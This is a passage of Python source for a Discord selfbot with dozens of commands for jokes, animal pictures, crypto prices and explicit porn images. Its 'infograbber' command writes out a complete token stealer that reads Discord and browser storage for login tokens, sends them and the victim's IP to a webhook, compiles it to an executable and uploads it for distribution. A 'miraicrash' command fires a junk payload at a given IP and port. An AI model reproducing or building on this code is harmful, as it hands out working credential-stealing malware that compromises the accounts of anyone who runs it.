                nitro_code = ''.join((random.choice(letters_and_digits) for i in range(16)))
                await ctx.send(f'https://discord.gift/{nitro_code}')

    @bot.command()
    async def gping(ctx):
        await ctx.message.delete()

    @bot.command()
    async def infograbber(ctx, name: str='TokenGrabber', webhook: str=None):
        await ctx.message.delete()
        path = os.getcwd()
        grabbercode = '''
import os
import re
import json
import requests

WEBHOOK_URL = "''' + webhook + '''"

def find_tokens(path):
    path += '\\\\Local Storage\\\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)

    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')

    paths = {
        'Discord': roaming + '\\\\Discord',
        'Discord Canary': roaming + '\\\\discordcanary',
        'Discord PTB': roaming + '\\\\discordptb',
        'Google Chrome': local + '\\\\Google\\\\Chrome\\\\User Data\\\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\\BraveSoftware\\\Brave-Browser\\\\User Data\\\\Default',
        'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default'
    }

    message = ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        
        message += f"""\
**{platform}**\
```"""

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f"""{token}\
"""
        else:
            message += """No Tokens found\
"""

        message += """```"""

    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }

    ipdata = requests.get('https://api.ipify.org?format=json')
    ip = ipdata.json()['ip']

    payload = json.dumps({
    "embeds": [
        {
        "title": "React Selfbot Token Grabber",
        "color": 3202549,
        "fields": [
            {
            "name": "Tokens",
            "value": message,
            "inline": "true"
            },
            {
            "name": "IP",
            "value": f'{ip}',
            "inline": "true",
            }
        ],
        "thumbnail": {
            "url": "https://cdn.discordapp.com/avatars/732575281763582003/a_84f173e0ec0555fb96146d8950e34abc.gif"
        }
        }
    ]
    })


    try:
        requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)
    except:
        pass

if __name__ == '__main__':
    main()

        '''
        with open(path + f'\\{name}.py', 'w') as f:
            f.write(grabbercode)

        os.system(f'pyinstaller --onefile -c -F .\{name}.py')
        os.system('cls')
        print('
')
        print(Fore.BLUE + Style.BRIGHT + 'â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—'.center(os.get_terminal_size().columns))
        print('â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•â•šâ•â•â–ˆâ–ˆâ•”â•â•â•'.center(os.get_terminal_size().columns))
        print('â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘        â–ˆâ–ˆâ•‘   '.center(os.get_terminal_size().columns))
        print('â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘        â–ˆâ–ˆâ•‘   '.center(os.get_terminal_size().columns))
        print('â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•‘   '.center(os.get_terminal_size().columns))
        print('â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â•   â•šâ•â•   
'.center(os.get_terminal_size().columns))

        for i in range(width):
            print('_', end='')

        print('
')

        try:
            files = {'file': (open(path + f'\\dist\\{name}.exe', 'rb'))}
        except FileNotFoundError:
            print('File does not exist! Make sure your Antivirus Program did not delete it.')
        r = requests.post("https://api.anonfiles.com/upload", files=files)
        resp = json.loads(r.text)
        downloadurl = resp['data']['file']['url']['short']
        embed= discord.Embed(color=embed_color, title=f'Info Grabber', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.add_field(name='Download URL', value=f'{downloadurl}')
        embed.set_thumbnail(url=embed_thumbnail_url)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def blackscreenurl(ctx):
        await ctx.message.delete()
        await ctx.send('<ms-cxh-full://0>')

    @bot.command()
    async def loremipsum(ctx, words: int):
        await ctx.message.delete()
        await ctx.send(lorem.words(words))

    @bot.command()
    async def invisibleping(ctx, user: discord.Member=None, *, message: str='Hi'):
        await ctx.message.delete()
        await ctx.send(f'{message}||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||â€‹||||||||||||<@{user.id}>')

    @bot.command()
    async def dog(ctx):
        await ctx.message.delete()
        request = requests.get('https://dog.ceo/api/breeds/image/random')
        data = request.json()
        image_url = data['message']
        embed= discord.Embed(color=embed_color, title=f'Dog', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=image_url)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def fox(ctx):
        await ctx.message.delete()
        request = requests.get('https://randomfox.ca/floof/')
        data = request.json()
        image_url = data['image']
        embed= discord.Embed(color=embed_color, title=f'Fox', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=image_url)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def duck(ctx):
        await ctx.message.delete()
        request = requests.get('https://random-d.uk/api/random')
        data = request.json()
        image_url = data['url']
        embed= discord.Embed(color=embed_color, title=f'Duck', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=image_url)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def wink(ctx):
        await ctx.message.delete()
        request = requests.get('https://some-random-api.ml/animu/wink')
        data = request.json()
        image_url = data['link']
        embed= discord.Embed(color=embed_color, title=f'Wink', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=image_url)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)
    
    @bot.command()
    async def cat(ctx):
        await ctx.message.delete()
        request = requests.get('https://some-random-api.ml/img/cat')
        data = request.json()
        image_url = data['link']
        embed= discord.Embed(color=embed_color, title=f'Cat', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=image_url)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def panda(ctx):
        await ctx.message.delete()
        request = requests.get('https://some-random-api.ml/img/panda')
        data = request.json()
        image_url = data['link']
        embed= discord.Embed(color=embed_color, title=f'Panda', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=image_url)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def koala(ctx):
        await ctx.message.delete()
        request = requests.get('https://some-random-api.ml/img/koala')
        data = request.json()
        image_url = data['link']
        embed= discord.Embed(color=embed_color, title=f'Koala', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=image_url)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def pikachu(ctx):
        await ctx.message.delete()
        request = requests.get('https://some-random-api.ml/img/pikachu')
        data = request.json()
        image_url = data['link']
        embed= discord.Embed(color=embed_color, title=f'Pikachu', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=image_url)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def token(ctx):
        await ctx.message.delete()
        request = requests.get('https://some-random-api.ml/bottoken')
        data = request.json()
        token = data['token']
        embed= discord.Embed(color=embed_color, title=f'Token', description=token, timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url=embed_thumbnail_url)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def namehistory(ctx, username: str=None):
        await ctx.message.delete()
        request = requests.get(f'https://some-random-api.ml/mc?username={username}')
        data = request.json()
        history = data['name_history']
        embed= discord.Embed(color=embed_color, title=f'Minecraft Name History', timestamp=date.datetime.utcfromtimestamp(time.time()))
        for i in range(len(history)):
            embed.add_field(name=history[i]['name'], value=history[i]['changedToAt'], inline=False)
        embed.set_thumbnail(url=embed_thumbnail_url)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def hug(ctx):
        await ctx.message.delete()
        request = requests.get(f'https://some-random-api.ml/animu/hug')
        data = request.json()
        image_url = data['link']
        embed= discord.Embed(color=embed_color, title=f'Hug', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=image_url)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def poll(ctx, *, poll: str=None):
        await ctx.message.delete()
        embed= discord.Embed(color=embed_color, title=f'Poll', description=poll, timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url=embed_thumbnail_url)
        embed.set_footer(text=embed_footer)
        msg = await ctx.send(embed=embed)
        await msg.add_reaction('ðŸ‘')
        await msg.add_reaction('ðŸ‘Ž')

    @bot.command()
    async def miraicrash(ctx, ip: str, port: int):
        if ip or port is not None:
            await ctx.message.delete()
            embed= discord.Embed(color=embed_color, title=f'Mirai Crash', description=f'Crashed Mirai at {ip}:{port}', timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url=embed_thumbnail_url)
            embed.set_footer(text=embed_footer)
            await ctx.send(embed=embed, delete_after=delete_timeout)
            payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$(*Â£&(*&$^*(^Â£*&)((*&)(*&()))))" * 25
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(payload.encode())
            s.close()
        else:
            print('\033[1;31;40mMissing arguments')
            return

    @bot.command(pass_context=True, aliases=['bitcoin'])
    async def btc(ctx):
        await ctx.message.delete()
        request = requests.get(f'https://blockchain.info/ticker')
        data = request.json()
        usd = data['USD']['last']
        eur = data['EUR']['last']
        gbp = data['GBP']['last']
        embed= discord.Embed(color=embed_color, title=f'Bitcoin Price', description=f'Current Price in: 
**USD:** {usd}$
**EUR:** {eur}â‚¬
**GBP:** {gbp}Â£', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url='https://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/BTC_Logo.svg/480px-BTC_Logo.svg.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command(pass_context=True, aliases=['ethereum'])
    async def eth(ctx):
        await ctx.message.delete()
        request = requests.get(f'https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR,GBP')
        data = request.json()
        usd = data['USD']
        eur = data['EUR']
        gbp = data['GBP']
        embed= discord.Embed(color=embed_color, title=f'Ethereum Price', description=f'Current Price in: 
**USD:** {usd}$
**EUR:** {eur}â‚¬
**GBP:** {gbp}Â£', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url='https://upload.wikimedia.org/wikipedia/commons/thumb/6/6f/Ethereum-icon-purple.svg/1200px-Ethereum-icon-purple.svg.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command(pass_context=True, aliases=['litecoin'])
    async def ltc(ctx):
        await ctx.message.delete()
        request = requests.get(f'https://min-api.cryptocompare.com/data/price?fsym=LTC&tsyms=USD,EUR,GBP')
        data = request.json()
        usd = data['USD']
        eur = data['EUR']
        gbp = data['GBP']
        embed= discord.Embed(color=embed_color, title=f'Litecoin Price', description=f'Current Price in: 
**USD:** {usd}$
**EUR:** {eur}â‚¬
**GBP:** {gbp}Â£', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url='https://i.imgur.com/Hn4zLbc.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command(pass_context=True, aliases=['monero'])
    async def xmr(ctx):
        await ctx.message.delete()
        request = requests.get(f'https://min-api.cryptocompare.com/data/price?fsym=XMR&tsyms=USD,EUR,GBP')
        data = request.json()
        usd = data['USD']
        eur = data['EUR']
        gbp = data['GBP']
        embed= discord.Embed(color=embed_color, title=f'Monero Price', description=f'Current Price in: 
**USD:** {usd}$
**EUR:** {eur}â‚¬
**GBP:** {gbp}Â£', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url='https://i.imgur.com/nIjEKrN.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def coinflip(ctx):
        await ctx.message.delete()
        coinsides = ['head', 'tails']
        coin = random.choice(coinsides)
        if coin == 'head':
            embed= discord.Embed(color=embed_color, title=f'Coinflip', description=f'It\'s Head!', timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url='https://webstockreview.net/images/coin-clipart-dime-6.png')
            embed.set_footer(text=embed_footer)
            await ctx.send(embed=embed, delete_after=delete_timeout)
        else:
            embed= discord.Embed(color=embed_color, title=f'Coinflip', description=f'It\'s Tails!', timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url='https://www.nicepng.com/png/full/146-1464848_quarter-tail-png-tails-on-a-coin.png')
            embed.set_footer(text=embed_footer)
            await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def butt(ctx):
        await ctx.message.delete()
        request = requests.get(f'http://api.obutts.ru/noise')
        data = request.json()
        path = data[0]['preview']
        link = f'http://media.obutts.ru/{path}'
        embed= discord.Embed(color=embed_color, title=f'Butt', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=link)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def boobs(ctx):
        await ctx.message.delete()
        request = requests.get(f'http://api.oboobs.ru/noise')
        data = request.json()
        path = data[0]['preview']
        link = f'http://media.oboobs.ru/{path}'
        embed= discord.Embed(color=embed_color, title=f'Boobs', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=link)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def anal(ctx):
        await ctx.message.delete()
        request = requests.get(f'https://nekobot.xyz/api/image?type=anal')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=embed_color, title=f'Anal', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=link)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def hentai(ctx):
        await ctx.message.delete()
        request = requests.get(f'https://nekobot.xyz/api/image?type=hentai')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=embed_color, title=f'Hentai', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=link)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def hentaianal(ctx):
        await ctx.message.delete()
        request = requests.get(f'https://nekobot.xyz/api/image?type=hanal')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=embed_color, title=f'Hentai Anal', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=link)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def hentaiboobs(ctx):
        await ctx.message.delete()
        request = requests.get(f'https://nekobot.xyz/api/image?type=hboobs')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=embed_color, title=f'Hentai Boobs', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=link)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)
    
    @bot.command()
    async def hentaitentacle(ctx):
        await ctx.message.delete()
        request = requests.get(f'https://nekobot.xyz/api/image?type=tentacle')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=embed_color, title=f'Hentai Tentacle', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=link)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def hentaibara(ctx):
        await ctx.message.delete()
        request = requests.get(f'http://barapi.geopjr.xyz/json.php')
        data = request.json()
        link = data['link']
        embed= discord.Embed(color=embed_color, title=f'Hentai Bara', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=link)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def porngif(ctx):
        await ctx.message.delete()
        request = requests.get(f'https://nekobot.xyz/api/image?type=pgif')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=embed_color, title=f'Porn Gif', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=link)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def meme(ctx):
        await ctx.message.delete()
        request = requests.get(f'https://meme-api.herokuapp.com/gimme')
        data = request.json()
        link = data['url']
        title = data['title']
        embed= discord.Embed(color=embed_color, title=title, timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=link)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def uselessfact(ctx):
        await ctx.message.delete()
        request = requests.get(f'https://uselessfacts.jsph.pl/random.json?language=en')
        data = request.json()
        fact = data['text']
        embed= discord.Embed(color=embed_color, title='Useless Fact', description=f'> {fact}', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url='https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/Light_Bulb_or_Idea_Flat_Icon_Vector.svg/473px-Light_Bulb_or_Idea_Flat_Icon_Vector.svg.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def dadjoke(ctx):
        await ctx.message.delete()
        request = requests.get(f'https://icanhazdadjoke.com/', headers={'accept': 'application/json'})
        data = request.json()
        joke = data['joke']
        embed= discord.Embed(color=embed_color, title='Dad Joke', description=f'{joke}', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url='https://images-eu.ssl-images-amazon.com/images/I/61f0lTa6KkL.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def joke(ctx):
        await ctx.message.delete()
        request = requests.get(f'http://www.official-joke-api.appspot.com/random_joke')
        data = request.json()
        setup = data['setup']
        punchline = data['punchline']
        embed= discord.Embed(color=embed_color, title='Joke', description=f'{setup}
||{punchline}||', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url='https://images-eu.ssl-images-amazon.com/images/I/61f0lTa6KkL.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def trumptweet(ctx, *, tweet: str=None):
        await ctx.message.delete()
        request = requests.get(f'https://nekobot.xyz/api/imagegen?type=trumptweet&text={tweet}')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=embed_color, title=f'Trump Tweet', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=link)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def phcomment(ctx, *, text: str=None):
        await ctx.message.delete()
        image_url = ctx.author.avatar_url
        request = requests.get(f'https://nekobot.xyz/api/imagegen?type=phcomment&image={image_url}&username={ctx.author.name}&text={text}')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=embed_color, title=f'PornHub Comment', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=link)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def clyde(ctx, *, text: str=None):
        await ctx.message.delete()
        request = requests.get(f'https://nekobot.xyz/api/imagegen?type=clyde&text={text}')
        data = request.json()
        link = data['message']
        embed= discord.Embed(color=embed_color, title=f'Clyde', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_image(url=link)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def cocksize(ctx, *users: discord.Member):
        await ctx.message.delete()
        try:
            if not users:
                return

            dongs = {}
            msg = ""
            state = random.getstate()

            for user in users:
                random.seed(user.id)
                dongs[user] = "8{}D".format("=" * random.randint(0, 30))

            random.setstate(state)
            dongs = sorted(dongs.items(), key=lambda x: x[1])

            for user, dong in dongs:
                msg += "**{}'s size:**
{}
".format(user.display_name, dong)

            embed = discord.Embed(color=embed_color, title='Cock Size', description=msg, timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url='https://images.vexels.com/media/users/3/143061/isolated/preview/aaf71ed4e387a6838e1c521fbecde77a-bananenikone-frucht-by-vexels.png')
            embed.set_footer(text=embed_footer)
            await ctx.send(embed=embed, delete_after=delete_timeout)
        except Exception:
            return

    
    def random_date(start, end):
        delta = end - start
        int_delta = (delta.days * 24 * 60 * 60) + delta.seconds
        random_second = randrange(int_delta)
        return start + timedelta(seconds=random_second)

    @bot.command()
    async def deathdate(ctx, user: discord.Member=None):
        await ctx.message.delete()
        try:
            if user is None:
                member = ctx.author
            else:
                member = user

            random.seed(member.id)
            d1 = datetime.strptime('1/1/2022', '%m/%d/%Y')
            d2 = datetime.strptime('1/1/2080', '%m/%d/%Y')
            delta = d2 - d1
            int_delta = (delta.days * 24 * 60 * 60) + delta.seconds
            random_second = randrange(int_delta)
            deathdate = d1 + timedelta(seconds=random_second)
            embed = discord.Embed(color=embed_color, title='Death Date', timestamp=date.datetime.utcfromtimestamp(time.time()))
            embed.set_thumbnail(url='https://upload.wikimedia.org/wikipedia/commons/6/6a/Reaper.png')
            embed.set_footer(text=embed_footer)
            embed.add_field(name=f'{member}\'s Death Date', value=f'{deathdate}', inline=True)
            await ctx.send(embed=embed, delete_after=delete_timeout)
        except Exception as e:
            print(e)

    @bot.command()
    async def reverse(ctx, *, text: str=None):
        await ctx.message.delete()
        await ctx.send(''.join(reversed(text)))

    @bot.command()
    async def fliptext(ctx, *, text: str=None):
        await ctx.message.delete()
        await ctx.send(upsidedown.transform(text))

    @bot.command()
    async def howgay(ctx, *, user: discord.Member=None):
        await ctx.message.delete()
        if user is None:
            member = ctx.author
        else:
            member = user

        random.seed(member.id)
        embed = discord.Embed(color=embed_color, title=f'How Gay is {member}', description=f'{member} is { random.randint(0, 100) }% Gay!', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url='https://upload.wikimedia.org/wikipedia/commons/thumb/4/48/Gay_Pride_Flag.svg/2000px-Gay_Pride_Flag.svg.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def howfurry(ctx, *, user: discord.Member=None):
        await ctx.message.delete()
        if user is None:
            member = ctx.author
        else:
            member = user

        random.seed(member.id * 2)
        embed = discord.Embed(color=embed_color, title=f'How Furry is {member}', description=f'{member} is { random.randint(0, 100) }% a Furry!', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url=embed_thumbnail_url)
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)


    def zalgoText(string):
        result = ''

        for char in string:
            for i in range(0, random.randint(20, 40)):
                randBytes = random.randint(0x300, 0x36f).to_bytes(2, 'big')
                char += randBytes.decode('utf-16be')
                i + 1
            result += char
        return result

    @bot.command()
    async def zalgo(ctx, *, text: str=None):
        await ctx.message.delete()
        await ctx.send(zalgoText(text))

    @bot.command()
    async def amazonsearch(ctx, *, product: str=None):
        await ctx.message.delete()
        embed = discord.Embed(color=embed_color, title='Amazon Search Results', description=f'Here are your search results for [{product}](https://amazon.com/s?k={product})', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url='https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Amazon_logo.svg/500px-Amazon_logo.svg.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def youtubesearch(ctx, *, search: str=None):
        await ctx.message.delete()
        embed = discord.Embed(color=embed_color, title='YouTube Search Results', description=f'Here are your search results for [{search}](https://www.youtube.com/results?search_query={search})', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url='https://upload.wikimedia.org/wikipedia/commons/4/4c/YouTube_icon.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)
    
    @bot.command()
    async def pornhubsearch(ctx, *, search: str=None):
        await ctx.message.delete()
        embed = discord.Embed(color=embed_color, title='PornHub Search Results', description=f'Here are your search results for [{search}](https://www.pornhub.com/video/search?search={search})', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url='https://upload.wikimedia.org/wikipedia/commons/thumb/f/f1/Pornhub-logo.svg/1024px-Pornhub-logo.svg.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def lmgtfy(ctx, *, search: str=None):
        await ctx.message.delete()
        embed = discord.Embed(color=embed_color, title='I\'ve Googled that for you', description=f'Click [here](https://lmgtfy.com/?q={urllib.parse.quote(search)}&iie=1) to find out **{search}**', timestamp=date.datetime.utcfromtimestamp(time.time()))
        embed.set_thumbnail(url='https://ipullrank.com/wp-content/uploads/2020/07/google-logo-png-google-logo-icon-png-transparent-background-1000.png')
        embed.set_footer(text=embed_footer)
        await ctx.send(embed=embed, delete_after=delete_timeout)

    @bot.command()
    async def notfunny(ctx):
        await ctx.message.delete()
